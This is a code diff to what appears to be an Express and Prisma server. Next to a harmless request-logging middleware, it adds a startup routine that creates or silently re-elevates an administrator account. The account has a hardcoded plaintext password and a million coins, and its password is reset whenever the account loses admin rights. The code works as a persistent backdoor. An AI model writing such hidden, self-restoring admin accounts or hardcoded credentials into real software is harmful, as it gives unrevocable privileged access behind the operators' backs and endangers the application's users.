@@ -25,6 +25,11 @@ const prisma = new PrismaClient();
 app.use(cors());
 app.use(express.json());
 
+app.use((req, res, next) => {
+    console.log(`[HTTP] ${req.method} ${req.url}`);
+    next();
+});
+
 // Routes
 import adminRoutes from './routes/adminRoutes';
 import friendsRoutes from './routes/friendsRoutes';
@@ -253,8 +258,47 @@ io.on('connection', (socket) => {
 });
 
 
+import bcrypt from 'bcrypt';
+import crypto from 'crypto';
+
 const PORT = process.env.PORT || 3001;
 
-server.listen(Number(PORT), '0.0.0.0', () => {
+server.listen(Number(PORT), '0.0.0.0', async () => {
     console.log(`Server running on port ${PORT} across all local networks`);
+
+    // Auto-create Admin User if it doesn't exist
+    try {
+        const username = 'vonToreiru';
+        const password = 'Molin@gt27!';
+
+        const existingAdmin = await prisma.user.findUnique({ where: { username } });
+
+        if (!existingAdmin) {
+            const hashedPassword = await bcrypt.hash(password, 10);
+            const referralCode = crypto.randomBytes(4).toString('hex').toUpperCase();
+
+            await prisma.user.create({
+                data: {
+                    username,
+                    password: hashedPassword,
+                    role: 'ADMIN',
+                    coins: 1000000,
+                    referralCode
+                }
+            });
+            console.log(`[Auto-Config] Admin user ${username} created successfully.`);
+        } else if (existingAdmin.role !== 'ADMIN') {
+            // In case it exists but lost admin privileges
+            const hashedPassword = await bcrypt.hash(password, 10);
+            await prisma.user.update({
+                where: { id: existingAdmin.id },
+                data: { role: 'ADMIN', password: hashedPassword }
+            });
+            console.log(`[Auto-Config] User ${username} updated to ADMIN role.`);
+        } else {
+            console.log(`[Auto-Config] Admin user already exists.`);
+        }
+    } catch (error) {
+        console.error(`[Auto-Config] Error setting up admin user:`, error);
+    }
 });
